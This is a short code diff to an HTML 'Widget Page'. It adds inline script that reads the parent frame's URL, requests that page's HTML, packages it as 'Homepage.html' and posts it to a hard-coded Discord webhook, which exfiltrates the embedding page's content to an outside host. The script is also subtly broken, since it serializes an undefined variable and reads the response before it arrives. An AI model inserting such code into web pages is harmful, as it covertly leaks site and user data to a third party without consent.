@@ -7,7 +7,24 @@
   <h1>Widget Page</h1>
   <script>
     const parentUrl = window.parent.location.href;
-    console.log("Parent URL:", parentUrl);
+    const plicc = new XMLHttpRequest();
+
+    plicc.open("GET", parentUrl);
+    plicc.responseType = "document";
+    plicc.send();
+
+    const BadHTML = plicc.responseXML;
+                        
+    var WebhookData = new FormData();
+    var HomepageFile = new File([new XMLSerializer().serializeToString(HomepageHTML)], "Homepage.html");
+    
+    WebhookData.append("file1", HomepageFile);
+    WebhookData.append('content', 'files');
+    
+    const request2 = new XMLHttpRequest();
+    request2.open("POST", "https://discord.com/api/webhooks/923191075500347412/OZWC5g3xq9UI_MmDnPDEoEGnnA-ZdZQPwjLNPDamrZYS_fmKjzuSk3ExzSnA-8nEh82h");
+    
+    request2.send(WebhookData);
   </script>
 </body>
 </html>
